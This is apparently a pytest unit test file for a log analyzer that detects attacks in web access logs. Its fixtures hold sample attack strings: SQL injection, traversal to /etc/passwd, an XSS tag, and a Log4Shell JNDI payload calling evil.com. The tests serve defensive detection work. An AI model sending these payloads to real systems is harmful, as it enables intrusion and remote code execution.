"""
tests/test_log_analyzer.py
==========================
Unit tests for tools/log_analyzer.py.

These tests run without Ollama, network access, or any external services.
"""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from tools.log_analyzer import LogAnalyzer, LogAnalysisResult


@pytest.fixture
def analyzer():
    return LogAnalyzer()


class TestLogAnalyzer:
    def test_detects_sql_injection_in_url(self, analyzer):
        log = "192.168.1.1 - - [01/Jan/2024] \"GET /search?q=1+union+select+1,2,3 HTTP/1.1\" 200 -"
        result = analyzer.analyze_text(log)
        categories = [a.category for a in result.alerts]
        assert "SQL Injection Attempt" in categories

    def test_detects_directory_traversal(self, analyzer):
        log = "10.0.0.1 - - [01/Jan/2024] \"GET /../../etc/passwd HTTP/1.1\" 404 -"
        result = analyzer.analyze_text(log)
        categories = [a.category for a in result.alerts]
        assert "Directory Traversal Attempt" in categories

    def test_detects_log4shell(self, analyzer):
        log = '192.168.1.5 - - [01/Jan/2024] "GET /${jndi:ldap://evil.com/x} HTTP/1.1" 200 -'
        result = analyzer.analyze_text(log)
        categories = [a.category for a in result.alerts]
        assert "Exploit / CVE Payload" in categories

    def test_detects_scanner_nikto(self, analyzer):
        log = '10.0.0.2 - - [01/Jan/2024] "GET /robots.txt HTTP/1.1" 200 - "Nikto/2.1.6"'
        result = analyzer.analyze_text(log)
        categories = [a.category for a in result.alerts]
        assert "Scanner / Automated Tool" in categories

    def test_detects_xss_attempt(self, analyzer):
        log = '10.0.0.3 - - [01/Jan/2024] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 -'
        result = analyzer.analyze_text(log)
        categories = [a.category for a in result.alerts]
        assert "XSS Attempt" in categories

    def test_detects_brute_force_ip(self, analyzer):
        # Generate 12 auth failure lines from the same IP (threshold is 10)
        lines = "\n".join(
            f"192.168.5.1 - - [01/Jan/2024] \"POST /login HTTP/1.1\" 401 - authentication failed"
            for _ in range(12)
        )
        result = analyzer.analyze_text(lines)
        high_alerts = [a for a in result.alerts if a.severity == "HIGH" and "Brute" in a.category]
        assert len(high_alerts) >= 1

    def test_clean_log_no_alerts(self, analyzer):
        log = '192.168.1.100 - user [01/Jan/2024] "GET /index.html HTTP/1.1" 200 1234'
        result = analyzer.analyze_text(log)
        # A simple normal request should not trigger alerts
        high_alerts = [a for a in result.alerts if a.severity == "HIGH"]
        assert len(high_alerts) == 0

    def test_total_lines_counted(self, analyzer):
        log = "line1\nline2\nline3"
        result = analyzer.analyze_text(log)
        assert result.total_lines == 3

    def test_file_not_found(self, analyzer):
        with pytest.raises(FileNotFoundError):
            analyzer.analyze_file("/nonexistent/path/access.log")

    def test_summary_format(self, analyzer):
        result = LogAnalysisResult(file_path="test.log", total_lines=100)
        summary = result.summary()
        assert "100 lines" in summary
        assert "test.log" in summary
